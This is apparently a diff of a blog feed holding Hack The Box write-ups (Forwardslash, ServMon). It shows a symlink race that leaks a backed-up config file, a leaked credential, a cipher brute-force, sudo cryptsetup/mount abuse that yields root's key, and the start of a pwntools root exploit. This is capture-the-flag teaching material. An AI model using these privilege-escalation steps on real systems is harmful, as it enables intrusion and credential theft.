+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;current_time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strftime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%H:%M:%S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/var/backups/config.php.bak&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/backup&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It must be executed in the home dir of chiv&lt;/p&gt;
+
+&lt;p&gt;Creds of pain:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pain:db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704&lt;/code&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;getting-root&quot;&gt;Getting root&lt;/h1&gt;
+
+&lt;p&gt;Now we can SSH as pain and find a the **encryptinator **that was made by our friend chiv:&lt;/p&gt;
+
+&lt;p&gt;Source code:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;reversed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;reversed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'REDACTED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'REDACTED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'REDACTED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'REDACTED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'REDACTED'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As well as a Ciphertext:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;,L
+&amp;gt;2Xբ
+|?I)E-˒\/;y[w#M2ʐY@'缘泣,P@5f$\*rwF3gX}i6~KY'%e&amp;gt;xo+g/K&amp;gt;^Nke
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I tried to understand the cipher and how it works out, but in the end i was curios if it was bruteforceable and voilà it worked:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def decrypt(key, msg):
+    file = open(&quot;/usr/share/wordlists/rockyou.txt&quot;)    
+    for line in file:
+        line = list(line)
+        with io.open('ciphertext', 'rb') as f:
+            msg = f.read()
+            msg = list(msg)
+            for i in range(len(msg)):
+                msg[i] = chr(msg[i])
+            for char_key in reversed(line):
+                for i in reversed(range(len(msg))):
+                    msg[i] = chr((ord(msg[i]) - (ord(char_key)+ord(msg[i-1])))%256)
+        print(''.join(msg) + '\n')
+
+decrypt(&quot;REDACTED&quot;, &quot;asd&quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Executing it gives the following password:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 file.py | strings -n 25&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The found key was: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;thismypassword&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can decrypt the cipher to receive some strange password:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cB!6%sdH8Lj^@Y\*$C2cf&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that we did that, we remember that there was a file in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/backups/recovery&lt;/code&gt;, a LUKS encrypted file that contains something that we want.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://files.nuclino.com/files/e12a8779-f0d0-4724-8ba3-0e35633f3932/52f919a6-7a02-44b0-b9c1-a20eeaec1c9a.png&quot; alt=&quot;52f919a6-7a02-44b0-b9c1-a20eeaec1c9a.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Checking the SUDO permissions, we can do the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User pain may run the following commands on forwardslash:
+    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
+    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
+    (root) NOPASSWD: /bin/umount ./mnt/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that means that we can move to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/mapper/&lt;/code&gt; and create a backup file using the image:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /dev/mapper/
+sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
+mkdir /tmp/mnt
+cd /tmp
+sudo /bin/mount /dev/mapper/backup ./mnt/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When looking into our mount file, we can now see that we have a private key - the only user that is left is root, so we know have successfully rooted the forwardslash!&lt;/p&gt;
+
+&lt;p&gt;root-private key:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://files.nuclino.com/files/4a493eb9-86e7-4891-9399-2e41ab32432f/id_rsa&quot;&gt;id_rsa&lt;/a&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="heap" /><category term="binary exploitation" /><category term="linux" /><summary type="html">Write-up of the box Forwardslash from Hack The Box</summary></entry><entry><title type="html">HackThebox - ServMon</title><link href="http://localhost:4000/boxes/ServMon/" rel="alternate" type="text/html" title="HackThebox - ServMon" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/boxes/ServMon</id><content type="html" xml:base="http://localhost:4000/boxes/ServMon/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 &lt;p class=&quot;text-justify&quot;&gt;This is an interesting box as it has gotten a lot of heat - mostly due to the steps required for root - and I can see why: The web interface might be slowish and buggy under load but also people can mess with each other - pushing the frustration. As this includes overwriting others’ files I think this box teaches what I call &lt;em&gt;gentleman behaviour&lt;/em&gt;. Try to not mess with other peoples stuff when working on the same box.&lt;/p&gt;
 &lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;
 &lt;p&gt;A quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan reveals&lt;/p&gt;
@@ -919,37 +1406,4 @@ Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.183
 C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;SClient++&amp;gt;whoami
 &lt;span class=&quot;nb&quot;&gt;whoami
 &lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="windows" /><summary type="html">Write-up of the box ServMon from Hack The Box</summary></entry><entry><title type="html">Another test</title><link href="http://localhost:4000/boxes/asd/" rel="alternate" type="text/html" title="Another test" /><published>2020-05-23T11:33:36-04:00</published><updated>2020-05-23T11:33:36-04:00</updated><id>http://localhost:4000/boxes/asd</id><content type="html" xml:base="http://localhost:4000/boxes/asd/">&lt;p&gt;TEST
-Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&lt;/p&gt;
-
-&lt;h1 id=&quot;root-exploit&quot;&gt;Root exploit&lt;/h1&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./libc.so.6'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;#p = process('./Protobs')
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sshConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'10.10.10.170'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'observer'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'id_rsa'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sshConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/opt/Configuration_Utility/Protobs'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
